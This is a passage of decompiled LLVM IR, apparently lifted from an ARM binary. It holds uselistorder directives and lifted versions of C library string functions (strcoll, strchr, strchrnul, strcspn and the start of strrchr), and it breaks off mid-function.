  uselistorder i32 %v8_16954, { 1, 0, 2 }
  uselistorder i32 %v5_16954, { 1, 0, 2 }
  uselistorder i32 %v2_16954, { 1, 0, 2 }
  uselistorder i32 %v0_16954, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_16974, { 4, 3, 2, 1, 0 }
  uselistorder i1 %v2_169b0, { 0, 2, 1 }
  uselistorder i32 %v1_169ac, { 2, 0, 1, 3 }
  uselistorder i32 %v4_16930, { 2, 0, 1, 3 }
  uselistorder i32 %v2_16930, { 2, 0, 1, 3 }
  uselistorder i32 %v0_169b4, { 1, 0, 3, 2 }
  uselistorder i32 %v0_16a4c76, { 0, 5, 1, 3, 2, 4 }
  uselistorder i32 %v1_16924, { 1, 0 }
  uselistorder i32 %v0_16924, { 3, 1, 0, 2 }
  uselistorder i32 %v2_1691c, { 2, 4, 0, 5, 1, 3 }
  uselistorder i32 %v1_1691c, { 1, 0, 2 }
  uselistorder i32 %v0_1691c, { 2, 0, 1, 3 }
  uselistorder i32 %v0_16a4c77, { 1, 0 }
  uselistorder i32 %v1_168fc, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_16904, { 1, 0 }
  uselistorder i32 %v0_168d8, { 3, 0, 1, 2 }
  uselistorder i32 %v1_168cc, { 1, 2, 0, 3 }
  uselistorder i32 %v5_168b8, { 1, 0, 2 }
  uselistorder i32 %v1_168b4, { 1, 0 }
  uselistorder i32 %v1_168ac, { 2, 0, 1, 4, 5, 3, 6 }
  uselistorder i32 %v0_168ac, { 1, 2, 0, 3 }
  uselistorder i32 %v4_168a4, { 0, 2, 1 }
  uselistorder i32 %v3_168a4, { 3, 0, 1, 2 }
  uselistorder i1 %v0_168a4, { 1, 0 }
  uselistorder i1 %v1_168a4, { 1, 0 }
  uselistorder i32 %v3_168a0, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_16898, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_16884, { 1, 2, 0 }
  uselistorder i32 %v1_1687c, { 0, 2, 1 }
  uselistorder i32 %v12_16878, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1686c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_16870, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 11, 10, 9, 8 }
  uselistorder i32 %v1_16860, { 0, 2, 1 }
  uselistorder i32 %v1_16858, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_16858, { 1, 2, 3, 0, 5, 4 }
  uselistorder i32 %v1_16850, { 1, 0 }
  uselistorder i32 %v1_16848, { 2, 1, 0 }
  uselistorder i32 %v2_16840, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v0_16840, { 1, 4, 0, 2, 3 }
  uselistorder i32 %v8_1683c, { 1, 0 }
  uselistorder i32 %v2_16830, { 1, 0 }
  uselistorder i32 %v1_16830, { 1, 4, 5, 3, 0, 6, 8, 2, 7, 9 }
  uselistorder i32 %v0_16830, { 1, 7, 8, 6, 4, 0, 5, 10, 2, 3, 9, 11 }
  uselistorder i8** %stack_var_-8, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r2.global-to-local, { 0, 31, 1, 2, 3, 4, 5, 32, 6, 7, 8, 9, 10, 33, 11, 12, 13, 14, 15, 34, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 27, 26, 28, 29, 30, 35, 36, 68, 37, 38, 39, 40, 41, 69, 42, 43, 44, 45, 46, 70, 47, 48, 49, 50, 51, 71, 52, 53, 54, 56, 55, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 72 }
  uselistorder i32* %r1.global-to-local, { 0, 3, 1, 15, 2, 4, 6, 8, 5, 16, 7, 9, 11, 13, 10, 17, 12, 14, 18, 23, 19, 20, 21, 22, 24, 25, 27, 26, 28, 29, 38, 30, 31, 39, 32, 40, 33, 41, 34, 35, 36, 37, 42, 45, 43, 55, 44, 46, 49, 47, 56, 48, 50, 53, 51, 57, 52, 54, 58, 59, 62, 60, 63, 61, 64, 65, 66, 67 }
  uselistorder i32* %r0.global-to-local, { 0, 22, 1, 2, 23, 3, 4, 24, 5, 6, 7, 8, 9, 10, 25, 11, 13, 12, 14, 15, 26, 16, 17, 27, 18, 19, 20, 21, 28, 29, 31, 30, 32, 33, 34 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 26, 18, 19, 20, 27, 21, 22, 23, 28, 24, 25, 29, 30, 31, 32, 33, 34, 35, 36, 37 }
  uselistorder i1* %cpsr_z.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 3, 21, 22, 23, 24, 25, 2, 26, 0, 27, 1, 29, 28, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47 }
  uselistorder i1* %cpsr_v.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 3, 21, 22, 23, 2, 24, 0, 25, 1, 27, 26, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44 }
  uselistorder i1* %cpsr_n.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 3, 22, 23, 24, 25, 26, 2, 27, 0, 28, 1, 30, 29, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50 }
  uselistorder i32 -20, { 1, 0 }
  uselistorder i32 2147483632, { 3, 4, 5, 2, 0, 1, 6 }
  uselistorder i32 -5, { 1, 0, 2, 3 }
  uselistorder i32 -12, { 2, 12, 13, 3, 15, 16, 4, 17, 18, 14, 11, 10, 9, 8, 7, 19, 20, 21, 22, 6, 0, 5, 1, 23, 24 }
  uselistorder i32 -32, { 3, 2, 4, 0, 1, 5 }
  uselistorder i32 27, { 1, 0, 2, 8, 6, 9, 3, 10, 4, 11, 5, 12, 7, 13 }
  uselistorder i32 -28, { 1, 2, 0 }
  uselistorder i32 -4, { 17, 61, 62, 63, 6, 18, 19, 20, 64, 65, 66, 7, 21, 22, 23, 67, 68, 69, 8, 24, 25, 70, 16, 15, 71, 72, 73, 14, 13, 12, 11, 26, 27, 28, 29, 30, 5, 31, 3, 32, 4, 74, 10, 33, 48, 49, 50, 9, 51, 52, 53, 34, 47, 2, 35, 41, 42, 43, 44, 45, 46, 0, 1, 54, 55, 56, 57, 58, 59, 60, 36, 38, 39, 40, 37 }
  uselistorder label %dec_label_pc_16ca0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16c34, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16bc8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16b68, { 1, 0 }
  uselistorder label %.thread14, { 2, 0, 1 }
  uselistorder label %.thread129, { 1, 0 }
  uselistorder label %bb150, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %dec_label_pc_16af4, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_16ab8, { 1, 0 }
  uselistorder label %dec_label_pc_16aa4, { 1, 0 }
  uselistorder label %dec_label_pc_16a64, { 2, 0, 1 }
  uselistorder label %dec_label_pc_169f8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1698c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1692c, { 1, 0 }
  uselistorder label %.thread128, { 1, 0 }
  uselistorder label %.thread127, { 1, 0 }
  uselistorder label %dec_label_pc_168fc, { 1, 0 }
  uselistorder label %.thread126, { 1, 0 }
  uselistorder label %.thread125, { 1, 0 }
  uselistorder label %bb142, { 1, 0 }
  uselistorder label %bb140, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %.thread115, { 1, 0 }
  uselistorder label %dec_label_pc_16898, { 1, 0 }
  uselistorder label %bb137, { 1, 0 }
  uselistorder label %dec_label_pc_16858, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_16cc4.pre = load i32, i32* @r1, align 4
  br label %entry

entry:                                            ; preds = %bb3, %bb
  %v0_16cc4 = phi i32 [ %v0_16cc4.pre, %bb ], [ %v5_16cc4, %bb3 ]
  %v0_16cc0 = phi i32 [ %tmp, %bb ], [ %v5_16cc0, %bb3 ]
  %v1_16cc0 = inttoptr i32 %v0_16cc0 to i8*
  %v2_16cc0 = load i8, i8* %v1_16cc0, align 1
  %v1_16cc4 = inttoptr i32 %v0_16cc4 to i8*
  %v2_16cc4 = load i8, i8* %v1_16cc4, align 1
  %v3_16cc4 = zext i8 %v2_16cc4 to i32
  %v2_16cc8 = icmp eq i8 %v2_16cc0, 0
  br i1 %v2_16cc8, label %.dec_label_pc_16cd4_crit_edge, label %bb3

bb3:                                              ; preds = %entry
  %v5_16cc4 = add i32 %v0_16cc4, 1
  %v5_16cc0 = add i32 %v0_16cc0, 1
  %v3_16cc0 = zext i8 %v2_16cc0 to i32
  %v10_16ccc = icmp eq i8 %v2_16cc0, %v2_16cc4
  br i1 %v10_16ccc, label %entry, label %dec_label_pc_16cd4

.dec_label_pc_16cd4_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_16cd4

dec_label_pc_16cd4:                               ; preds = %bb3, %.dec_label_pc_16cd4_crit_edge
  %.pn = phi i32 [ 0, %.dec_label_pc_16cd4_crit_edge ], [ %v3_16cc0, %bb3 ]
  %v2_16cd4.pre-phi = sub nsw i32 %.pn, %v3_16cc4
  ret i32 %v2_16cd4.pre-phi

; uselistorder directives
  uselistorder i8 %v2_16cc0, { 0, 2, 1 }
  uselistorder i32 %v0_16cc0, { 1, 0 }
  uselistorder i32 %v0_16cc4, { 1, 0 }
  uselistorder label %dec_label_pc_16cd4, { 1, 0 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %v1_16d44 = urem i32 %arg1, 256
  %v0_16d643 = load i32, i32* @r0, align 4
  %v1_16d644 = urem i32 %v0_16d643, 4
  %v2_16d645 = icmp eq i32 %v1_16d644, 0
  br i1 %v2_16d645, label %dec_label_pc_16d6c, label %dec_label_pc_16d4c

dec_label_pc_16d4c:                               ; preds = %entry, %dec_label_pc_16d60
  %v0_16d60 = phi i32 [ %v1_16d60, %dec_label_pc_16d60 ], [ %v0_16d643, %entry ]
  %v1_16d4c = inttoptr i32 %v0_16d60 to i8*
  %v2_16d4c = load i8, i8* %v1_16d4c, align 1
  %v3_16d4c = zext i8 %v2_16d4c to i32
  %v9_16d50 = icmp eq i32 %v3_16d4c, %v1_16d44
  br i1 %v9_16d50, label %dec_label_pc_16e20, label %dec_label_pc_16d58

dec_label_pc_16d58:                               ; preds = %dec_label_pc_16d4c
  %v2_16d58 = icmp eq i8 %v2_16d4c, 0
  br i1 %v2_16d58, label %dec_label_pc_16e1c, label %dec_label_pc_16d60

dec_label_pc_16d60:                               ; preds = %dec_label_pc_16d58
  %v1_16d60 = add i32 %v0_16d60, 1
  %v1_16d64 = urem i32 %v1_16d60, 4
  %v2_16d64 = icmp eq i32 %v1_16d64, 0
  br i1 %v2_16d64, label %dec_label_pc_16d6c, label %dec_label_pc_16d4c

dec_label_pc_16d6c:                               ; preds = %dec_label_pc_16d60, %entry
  %v0_16d70 = phi i32 [ %v0_16d643, %entry ], [ %v1_16d60, %dec_label_pc_16d60 ]
  %v4_16d6c = mul nuw nsw i32 %v1_16d44, 256
  %v5_16d6c = or i32 %v4_16d6c, %v1_16d44
  %v4_16d74 = mul i32 %v5_16d6c, 65536
  %v5_16d74 = or i32 %v4_16d74, %v5_16d6c
  br label %dec_label_pc_16d78

dec_label_pc_16d78:                               ; preds = %dec_label_pc_16e14, %dec_label_pc_16db4, %dec_label_pc_16d6c
  %v0_16ddc = phi i32 [ %v0_16d70, %dec_label_pc_16d6c ], [ %v4_16d78, %dec_label_pc_16db4 ], [ %v4_16d78, %dec_label_pc_16e14 ]
  %v1_16d78 = inttoptr i32 %v0_16ddc to i32*
  %v2_16d78 = load i32, i32* %v1_16d78, align 4
  %v4_16d78 = add i32 %v0_16ddc, 4
  %v2_16d80 = xor i32 %v2_16d78, %v5_16d74
  %v2_16d8c = add i32 %v2_16d78, 2130640639
  %v1_16d90 = sub i32 -1, %v2_16d78
  %v2_16d94 = xor i32 %v2_16d8c, %v1_16d90
  %v2_16da0 = and i32 %v2_16d94, -2130640640
  store i32 %v2_16da0, i32* @r1, align 4
  %v2_16da8 = icmp eq i32 %v2_16da0, 0
  br i1 %v2_16da8, label %dec_label_pc_16db4, label %dec_label_pc_16dbc

dec_label_pc_16db4:                               ; preds = %dec_label_pc_16d78
  %v2_16d84 = add i32 %v2_16d80, 2130640639
  %v1_16d9c = sub i32 -1, %v2_16d80
  %v2_16da4 = xor i32 %v2_16d84, %v1_16d9c
  %v2_16dac = and i32 %v2_16da4, -2130640640
  %v2_16db4 = icmp eq i32 %v2_16dac, 0
  br i1 %v2_16db4, label %dec_label_pc_16d78, label %dec_label_pc_16dbc

dec_label_pc_16dbc:                               ; preds = %dec_label_pc_16d78, %dec_label_pc_16db4
  %v2_16dbc = inttoptr i32 %v0_16ddc to i8*
  %v3_16dbc = load i8, i8* %v2_16dbc, align 1
  %v4_16dbc = zext i8 %v3_16dbc to i32
  %v9_16dc0 = icmp eq i32 %v4_16dbc, %v1_16d44
  br i1 %v9_16dc0, label %dec_label_pc_16e20, label %dec_label_pc_16dcc

dec_label_pc_16dcc:                               ; preds = %dec_label_pc_16dbc
  %v2_16dcc = icmp eq i8 %v3_16dbc, 0
  br i1 %v2_16dcc, label %dec_label_pc_16e1c, label %dec_label_pc_16dd4

dec_label_pc_16dd4:                               ; preds = %dec_label_pc_16dcc
  %v1_16dd4 = add i32 %v0_16ddc, 1
  %v2_16dd4 = inttoptr i32 %v1_16dd4 to i8*
  %v3_16dd4 = load i8, i8* %v2_16dd4, align 1
  %v4_16dd4 = zext i8 %v3_16dd4 to i32
  %v9_16dd8 = icmp eq i32 %v4_16dd4, %v1_16d44
  br i1 %v9_16dd8, label %dec_label_pc_16e20, label %dec_label_pc_16de4

dec_label_pc_16de4:                               ; preds = %dec_label_pc_16dd4
  %v2_16de4 = icmp eq i8 %v3_16dd4, 0
  br i1 %v2_16de4, label %dec_label_pc_16e1c, label %dec_label_pc_16dec

dec_label_pc_16dec:                               ; preds = %dec_label_pc_16de4
  %v1_16dec = add i32 %v0_16ddc, 2
  %v2_16dec = inttoptr i32 %v1_16dec to i8*
  %v3_16dec = load i8, i8* %v2_16dec, align 1
  %v4_16dec = zext i8 %v3_16dec to i32
  %v9_16df0 = icmp eq i32 %v4_16dec, %v1_16d44
  br i1 %v9_16df0, label %dec_label_pc_16e20, label %dec_label_pc_16dfc

dec_label_pc_16dfc:                               ; preds = %dec_label_pc_16dec
  %v2_16dfc = icmp eq i8 %v3_16dec, 0
  br i1 %v2_16dfc, label %dec_label_pc_16e1c, label %dec_label_pc_16e04

dec_label_pc_16e04:                               ; preds = %dec_label_pc_16dfc
  %v1_16e04 = add i32 %v0_16ddc, 3
  %v2_16e04 = inttoptr i32 %v1_16e04 to i8*
  %v3_16e04 = load i8, i8* %v2_16e04, align 1
  %v4_16e04 = zext i8 %v3_16e04 to i32
  %v9_16e08 = icmp eq i32 %v4_16e04, %v1_16d44
  br i1 %v9_16e08, label %dec_label_pc_16e20, label %dec_label_pc_16e14

dec_label_pc_16e14:                               ; preds = %dec_label_pc_16e04
  %v2_16e14 = icmp eq i8 %v3_16e04, 0
  br i1 %v2_16e14, label %dec_label_pc_16e1c, label %dec_label_pc_16d78

dec_label_pc_16e1c:                               ; preds = %dec_label_pc_16d58, %dec_label_pc_16e14, %dec_label_pc_16dfc, %dec_label_pc_16de4, %dec_label_pc_16dcc
  br label %dec_label_pc_16e20

dec_label_pc_16e20:                               ; preds = %dec_label_pc_16d4c, %dec_label_pc_16e04, %dec_label_pc_16dec, %dec_label_pc_16dd4, %dec_label_pc_16dbc, %dec_label_pc_16e1c
  %v1_16e24 = phi i32 [ 0, %dec_label_pc_16e1c ], [ %v1_16e04, %dec_label_pc_16e04 ], [ %v1_16dec, %dec_label_pc_16dec ], [ %v1_16dd4, %dec_label_pc_16dd4 ], [ %v0_16ddc, %dec_label_pc_16dbc ], [ %v0_16d60, %dec_label_pc_16d4c ]
  ret i32 %v1_16e24

; uselistorder directives
  uselistorder i32 %v4_16d78, { 1, 0 }
  uselistorder i32 %v2_16d78, { 0, 2, 1 }
  uselistorder i32 %v0_16ddc, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_16d6c, { 1, 0 }
  uselistorder i32 %v1_16d60, { 1, 0, 2 }
  uselistorder i32 %v0_16d643, { 2, 1, 0 }
  uselistorder i32 %v1_16d44, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_16e20, { 5, 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_16e1c, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_16dbc, { 1, 0 }
  uselistorder label %dec_label_pc_16d4c, { 1, 0 }
}

define i32 @__GI_strchrnul(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %v1_16e34 = urem i32 %arg1, 256
  %v0_16e542 = load i32, i32* @r0, align 4
  %v1_16e543 = urem i32 %v0_16e542, 4
  %v2_16e544 = icmp eq i32 %v1_16e543, 0
  br i1 %v2_16e544, label %dec_label_pc_16e5c, label %dec_label_pc_16e3c

dec_label_pc_16e3c:                               ; preds = %entry, %dec_label_pc_16e50
  %v0_16e50 = phi i32 [ %v1_16e50, %dec_label_pc_16e50 ], [ %v0_16e542, %entry ]
  %v1_16e3c = inttoptr i32 %v0_16e50 to i8*
  %v2_16e3c = load i8, i8* %v1_16e3c, align 1
  %v3_16e3c = zext i8 %v2_16e3c to i32
  %v9_16e40 = icmp eq i32 %v3_16e3c, %v1_16e34
  br i1 %v9_16e40, label %dec_label_pc_16f0c, label %dec_label_pc_16e48

dec_label_pc_16e48:                               ; preds = %dec_label_pc_16e3c
  %v2_16e48 = icmp eq i8 %v2_16e3c, 0
  br i1 %v2_16e48, label %dec_label_pc_16f0c, label %dec_label_pc_16e50

dec_label_pc_16e50:                               ; preds = %dec_label_pc_16e48
  %v1_16e50 = add i32 %v0_16e50, 1
  %v1_16e54 = urem i32 %v1_16e50, 4
  %v2_16e54 = icmp eq i32 %v1_16e54, 0
  br i1 %v2_16e54, label %dec_label_pc_16e5c, label %dec_label_pc_16e3c

dec_label_pc_16e5c:                               ; preds = %dec_label_pc_16e50, %entry
  %v0_16e60 = phi i32 [ %v0_16e542, %entry ], [ %v1_16e50, %dec_label_pc_16e50 ]
  %v4_16e5c = mul nuw nsw i32 %v1_16e34, 256
  %v5_16e5c = or i32 %v4_16e5c, %v1_16e34
  %v4_16e64 = mul i32 %v5_16e5c, 65536
  %v5_16e64 = or i32 %v4_16e64, %v5_16e5c
  br label %dec_label_pc_16e68

dec_label_pc_16e68:                               ; preds = %dec_label_pc_16f04, %dec_label_pc_16ea4, %dec_label_pc_16e5c
  %v0_16ecc = phi i32 [ %v0_16e60, %dec_label_pc_16e5c ], [ %v4_16e68, %dec_label_pc_16ea4 ], [ %v4_16e68, %dec_label_pc_16f04 ]
  %v1_16e68 = inttoptr i32 %v0_16ecc to i32*
  %v2_16e68 = load i32, i32* %v1_16e68, align 4
  %v4_16e68 = add i32 %v0_16ecc, 4
  %v2_16e70 = xor i32 %v2_16e68, %v5_16e64
  %v2_16e7c = add i32 %v2_16e68, 2130640639
  %v1_16e80 = sub i32 -1, %v2_16e68
  %v2_16e84 = xor i32 %v2_16e7c, %v1_16e80
  %v2_16e90 = and i32 %v2_16e84, -2130640640
  store i32 %v2_16e90, i32* @r1, align 4
  %v2_16e98 = icmp eq i32 %v2_16e90, 0
  br i1 %v2_16e98, label %dec_label_pc_16ea4, label %dec_label_pc_16eac

dec_label_pc_16ea4:                               ; preds = %dec_label_pc_16e68
  %v2_16e74 = add i32 %v2_16e70, 2130640639
  %v1_16e8c = sub i32 -1, %v2_16e70
  %v2_16e94 = xor i32 %v2_16e74, %v1_16e8c
  %v2_16e9c = and i32 %v2_16e94, -2130640640
  %v2_16ea4 = icmp eq i32 %v2_16e9c, 0
  br i1 %v2_16ea4, label %dec_label_pc_16e68, label %dec_label_pc_16eac

dec_label_pc_16eac:                               ; preds = %dec_label_pc_16e68, %dec_label_pc_16ea4
  %v2_16eac = inttoptr i32 %v0_16ecc to i8*
  %v3_16eac = load i8, i8* %v2_16eac, align 1
  %v4_16eac = zext i8 %v3_16eac to i32
  %v9_16eb0 = icmp eq i32 %v4_16eac, %v1_16e34
  br i1 %v9_16eb0, label %dec_label_pc_16f0c, label %dec_label_pc_16ebc

dec_label_pc_16ebc:                               ; preds = %dec_label_pc_16eac
  %v2_16ebc = icmp eq i8 %v3_16eac, 0
  br i1 %v2_16ebc, label %dec_label_pc_16f0c, label %dec_label_pc_16ec4

dec_label_pc_16ec4:                               ; preds = %dec_label_pc_16ebc
  %v1_16ec4 = add i32 %v0_16ecc, 1
  %v2_16ec4 = inttoptr i32 %v1_16ec4 to i8*
  %v3_16ec4 = load i8, i8* %v2_16ec4, align 1
  %v4_16ec4 = zext i8 %v3_16ec4 to i32
  %v9_16ec8 = icmp eq i32 %v4_16ec4, %v1_16e34
  br i1 %v9_16ec8, label %dec_label_pc_16f0c, label %dec_label_pc_16ed4

dec_label_pc_16ed4:                               ; preds = %dec_label_pc_16ec4
  %v2_16ed4 = icmp eq i8 %v3_16ec4, 0
  br i1 %v2_16ed4, label %dec_label_pc_16f0c, label %dec_label_pc_16edc

dec_label_pc_16edc:                               ; preds = %dec_label_pc_16ed4
  %v1_16edc = add i32 %v0_16ecc, 2
  %v2_16edc = inttoptr i32 %v1_16edc to i8*
  %v3_16edc = load i8, i8* %v2_16edc, align 1
  %v4_16edc = zext i8 %v3_16edc to i32
  %v9_16ee0 = icmp eq i32 %v4_16edc, %v1_16e34
  br i1 %v9_16ee0, label %dec_label_pc_16f0c, label %dec_label_pc_16eec

dec_label_pc_16eec:                               ; preds = %dec_label_pc_16edc
  %v2_16eec = icmp eq i8 %v3_16edc, 0
  br i1 %v2_16eec, label %dec_label_pc_16f0c, label %dec_label_pc_16ef4

dec_label_pc_16ef4:                               ; preds = %dec_label_pc_16eec
  %v1_16ef4 = add i32 %v0_16ecc, 3
  %v2_16ef4 = inttoptr i32 %v1_16ef4 to i8*
  %v3_16ef4 = load i8, i8* %v2_16ef4, align 1
  %v4_16ef4 = zext i8 %v3_16ef4 to i32
  %v9_16ef8 = icmp eq i32 %v4_16ef4, %v1_16e34
  br i1 %v9_16ef8, label %dec_label_pc_16f0c, label %dec_label_pc_16f04

dec_label_pc_16f04:                               ; preds = %dec_label_pc_16ef4
  %v2_16f04 = icmp eq i8 %v3_16ef4, 0
  br i1 %v2_16f04, label %dec_label_pc_16f0c, label %dec_label_pc_16e68

dec_label_pc_16f0c:                               ; preds = %dec_label_pc_16e48, %dec_label_pc_16e3c, %dec_label_pc_16f04, %dec_label_pc_16ef4, %dec_label_pc_16eec, %dec_label_pc_16edc, %dec_label_pc_16ed4, %dec_label_pc_16ec4, %dec_label_pc_16ebc, %dec_label_pc_16eac
  %v1_16f10 = phi i32 [ %v1_16ef4, %dec_label_pc_16f04 ], [ %v1_16ef4, %dec_label_pc_16ef4 ], [ %v1_16edc, %dec_label_pc_16eec ], [ %v1_16edc, %dec_label_pc_16edc ], [ %v1_16ec4, %dec_label_pc_16ed4 ], [ %v1_16ec4, %dec_label_pc_16ec4 ], [ %v0_16ecc, %dec_label_pc_16ebc ], [ %v0_16ecc, %dec_label_pc_16eac ], [ %v0_16e50, %dec_label_pc_16e3c ], [ %v0_16e50, %dec_label_pc_16e48 ]
  ret i32 %v1_16f10

; uselistorder directives
  uselistorder i32 %v4_16e68, { 1, 0 }
  uselistorder i32 %v2_16e68, { 0, 2, 1 }
  uselistorder i32 %v0_16ecc, { 0, 1, 2, 3, 4, 5, 7, 6 }
  uselistorder i32 %v5_16e5c, { 1, 0 }
  uselistorder i32 %v1_16e50, { 1, 0, 2 }
  uselistorder i32 %v0_16e542, { 2, 1, 0 }
  uselistorder i32 %v1_16e34, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 2130640639, { 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_16f0c, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 1 }
  uselistorder label %dec_label_pc_16eac, { 1, 0 }
  uselistorder label %dec_label_pc_16e3c, { 1, 0 }
}

define i32 @strcspn() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v3_16f1c = load i32, i32* @r4, align 4
  store i32 %v3_16f1c, i32* %stack_var_-16, align 4
  %v6_16f1c = load i32, i32* @r5, align 4
  %v9_16f1c = load i32, i32* @r6, align 4
  %v0_16f20 = load i32, i32* @r0, align 4
  %v0_16f24 = load i32, i32* @r1, align 4
  store i32 %v0_16f24, i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v1_16f408 = inttoptr i32 %v0_16f20 to i8*
  %v2_16f409 = load i8, i8* %v1_16f408, align 1
  %v3_16f4010 = zext i8 %v2_16f409 to i32
  store i32 %v3_16f4010, i32* @r1, align 4
  %v2_16f4411 = icmp eq i8 %v2_16f409, 0
  store i32 %v0_16f24, i32* @r0, align 4
  %v1_16f4c12 = add i32 %v0_16f20, 1
  store i32 %v1_16f4c12, i32* @r4, align 4
  br i1 %v2_16f4411, label %dec_label_pc_16f54, label %dec_label_pc_16f30

dec_label_pc_16f30:                               ; preds = %entry, %dec_label_pc_16f3c
  %v3_16f4014 = phi i32 [ %v3_16f40, %dec_label_pc_16f3c ], [ %v3_16f4010, %entry ]
  %v0_16f4813 = phi i32 [ %v0_16f48.pre, %dec_label_pc_16f3c ], [ %v0_16f24, %entry ]
  %v2_16f30 = call i32 @__GI_strchr(i32 %v0_16f4813, i32 %v3_16f4014)
  %v2_16f34 = icmp eq i32 %v2_16f30, 0
  %v0_16f3c = load i32, i32* @r5, align 4
  br i1 %v2_16f34, label %dec_label_pc_16f3c, label %dec_label_pc_16f54

dec_label_pc_16f3c:                               ; preds = %dec_label_pc_16f30
  %v1_16f3c = add i32 %v0_16f3c, 1
  %v0_16f40.pre = load i32, i32* @r4, align 4
  %v0_16f48.pre = load i32, i32* @r6, align 4
  store i32 %v1_16f3c, i32* @r5, align 4
  %v1_16f40 = inttoptr i32 %v0_16f40.pre to i8*
  %v2_16f40 = load i8, i8* %v1_16f40, align 1
  %v3_16f40 = zext i8 %v2_16f40 to i32
  store i32 %v3_16f40, i32* @r1, align 4
  %v2_16f44 = icmp eq i8 %v2_16f40, 0
  store i32 %v0_16f48.pre, i32* @r0, align 4
  %v1_16f4c = add i32 %v0_16f40.pre, 1
  store i32 %v1_16f4c, i32* @r4, align 4
  br i1 %v2_16f44, label %dec_label_pc_16f54, label %dec_label_pc_16f30

dec_label_pc_16f54:                               ; preds = %dec_label_pc_16f3c, %dec_label_pc_16f30, %entry
  %v0_16f54 = phi i32 [ 0, %entry ], [ %v0_16f3c, %dec_label_pc_16f30 ], [ %v1_16f3c, %dec_label_pc_16f3c ]
  %v2_16f58 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_16f58, i32* @r4, align 4
  store i32 %v6_16f1c, i32* @r5, align 4
  store i32 %v9_16f1c, i32* @r6, align 4
  ret i32 %v0_16f54

; uselistorder directives
  uselistorder i32 %v3_16f40, { 1, 0 }
  uselistorder i32 %v0_16f48.pre, { 1, 0 }
  uselistorder i32 %v0_16f40.pre, { 1, 0 }
  uselistorder label %dec_label_pc_16f30, { 1, 0 }
}

define i32 @__GI_strrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_16f64 = urem i32 %arg2, 256
  store i32 %v1_16f64, i32* @r4, align 4
  %v2_16f64 = icmp eq i32 %v1_16f64, 0
  br i1 %v2_16f64, label %dec_label_pc_16f78, label %dec_label_pc_16f8c.preheader

dec_label_pc_16f8c.preheader:                     ; preds = %entry
  store i32 0, i32* @r5, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_16f943 = call i32 @__GI_strchr(i32 %arg1, i32 %v1_16f64)
  %v2_16f985 = icmp eq i32 %v2_16f943, 0
  br i1 %v2_16f985, label %dec_label_pc_16fa0, label %dec_label_pc_16f84

dec_label_pc_16f78:                               ; preds = %entry
  %v2_16f7c = call i32 @__GI_strchr(i32 %arg1, i32 0)
  br label %dec_label_pc_16fa4

dec_label_pc_16f84:                               ; preds = %dec_label_pc_16f8c.preheader, %dec_label_pc_16f84
  %v2_16f946 = phi i32 [ %v2_16f94, %dec_label_pc_16f84 ], [ %v2_16f943, %dec_label_pc_16f8c.preheader ]
  store i32 %v2_16f946, i32* @r5, align 4
  %v1_16f88 = add i32 %v2_16f946, 1
  store i32 %v1_16f88, i32* @r0, align 4
  %v0_16f90 = load i32, i32* @r4, align 4
  %v2_16f94 = call i32 @__GI_strchr(i32 %v1_16f88, i32 %v0_16f90)
  %v2_16f98 = icmp eq i32 %v2_16f94, 0
  br i1 %v2_16f98, label %dec_label_pc_16fa0, label %dec_label_pc_16f84

